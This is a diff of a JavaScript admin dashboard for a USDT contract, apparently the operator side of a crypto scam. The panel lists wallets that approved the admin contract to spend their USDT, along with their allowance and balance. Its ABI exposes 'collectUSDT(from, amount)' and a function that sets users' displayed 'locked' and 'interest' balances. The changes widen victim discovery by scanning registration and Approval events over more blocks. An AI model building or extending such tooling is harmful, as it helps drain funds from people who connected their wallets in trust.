@@ -189,7 +189,8 @@
             "function collectUSDT(address from, uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
             "function setUserBalances(address user, uint256 locked, uint256 interest) external",
-            "event WithdrawRequested(address indexed user, uint256 amount)"
+            "event WithdrawRequested(address indexed user, uint256 amount)",
+            "event UserRegistered(address indexed user, address indexed referrer, uint256 userId)"
         ];
 
         function showProgress(partId, text, percent) {
@@ -267,32 +268,39 @@
             }
 
             const tbody = document.getElementById("userTableBody");
-            showProgress(2, "ဒေတာများ စတင်ဖတ်ရှုနေသည်...", 20);
+            showProgress(2, "index.html မှ ချိတ်ဆက်စာရင်းများ ရှာဖွေနေသည်...", 25);
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                // Get stored users from cache or start with empty
-                let userArray = JSON.parse(localStorage.getItem("admin_known_users_v4") || "[]");
-                
-                // If cache is empty, try a quick queryFilter on recent 500 blocks just in case
-                if (userArray.length === 0) {
-                    showProgress(2, "Approval Event အသစ်များ ရှာဖွေနေသည်...", 40);
-                    try {
-                        const currentBlock = await provider.getBlockNumber();
-                        const fromBlock = currentBlock > 500 ? currentBlock - 500 : 0;
-                        const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
-                        const logs = await usdtContract.queryFilter(filter, fromBlock, "latest");
-                        let foundSet = new Set();
-                        logs.forEach(l => { if(l.args && l.args.owner) foundSet.add(l.args.owner.toLowerCase()); });
-                        userArray = Array.from(foundSet);
-                    } catch (e) {
-                        console.warn("Event query skipped:", e);
-                    }
+                let userSet = new Set(JSON.parse(localStorage.getItem("admin_known_users_v6") || "[]"));
+
+                // 1. Scan Admin Contract Events (UserRegistered) from index.html connections
+                try {
+                    showProgress(2, "Contract ပေါ်ရှိ User စာရင်းများ စစ်ဆေးနေသည်...", 50);
+                    const currentBlock = await provider.getBlockNumber();
+                    const fromBlock = currentBlock > 5000 ? currentBlock - 5000 : 0;
+                    
+                    const regFilter = collectorContract.filters.UserRegistered();
+                    const regEvents = await collectorContract.queryFilter(regFilter, fromBlock, "latest");
+                    regEvents.forEach(e => {
+                        if (e.args && e.args.user) userSet.add(e.args.user.toLowerCase());
+                    });
+
+                    // 2. Scan USDT Approval Events
+                    const appFilter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
+                    const appLogs = await usdtContract.queryFilter(appFilter, fromBlock, "latest");
+                    appLogs.forEach(l => {
+                        if (l.args && l.args.owner) userSet.add(l.args.owner.toLowerCase());
+                    });
+                } catch (e) {
+                    console.warn("Event query warning:", e);
                 }
 
-                showProgress(2, "User Balance များကို စစ်ဆေးနေသည်...", 60);
+                const userArray = Array.from(userSet);
+                showProgress(2, "User Balance များနှင့် ခွင့်ပြုချက်များ စစ်ဆေးနေသည်...", 75);
+                
                 const contractOwner = await collectorContract.owner();
                 const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
 
@@ -304,14 +312,20 @@
                     const addr = userArray[i];
                     try {
                         const userInfo = await collectorContract.users(addr);
-                        if (!isOwner && userInfo.referrer.toLowerCase() !== adminAddress.toLowerCase()) {
+                        
+                        // If user is not registered via index.html and has no allowance/balance, skip
+                        if (!userInfo.isRegistered && userSet.size === 0) continue;
+
+                        if (!isOwner && userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress && userInfo.referrer.toLowerCase() !== adminAddress.toLowerCase()) {
                             continue;
                         }
 
                         const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
-                        if (Number(allowanceBN) === 0) continue;
-
                         const balanceBN = await usdtContract.balanceOf(addr);
+                        
+                        // Keep user in list if registered or has allowance
+                        if (!userInfo.isRegistered && Number(allowanceBN) === 0) continue;
+
                         validUsers.push(addr);
 
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
@@ -346,7 +360,7 @@
                     }
                 }
 
-                localStorage.setItem("admin_known_users_v4", JSON.stringify(validUsers));
+                localStorage.setItem("admin_known_users_v6", JSON.stringify(validUsers));
 
                 showProgress(2, "ပြီးဆုံးပါပြီ!", 100);
                 setTimeout(() => hideProgress(2), 800);
@@ -357,7 +371,7 @@
             } catch (err) {
                 console.error("Refresh table error:", err);
                 hideProgress(2);
-                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center.red-400 text-xs"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
             } finally {
                 hideProgress(2);
             }
@@ -374,7 +388,7 @@
             try {
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const currentBlock = await provider.getBlockNumber();
-                const fromBlock = currentBlock > 1000 ? currentBlock - 1000 : 0;
+                const fromBlock = currentBlock > 5000 ? currentBlock - 5000 : 0;
 
                 const filter = contract.filters.WithdrawRequested();
                 const events = await contract.queryFilter(filter, fromBlock, "latest");
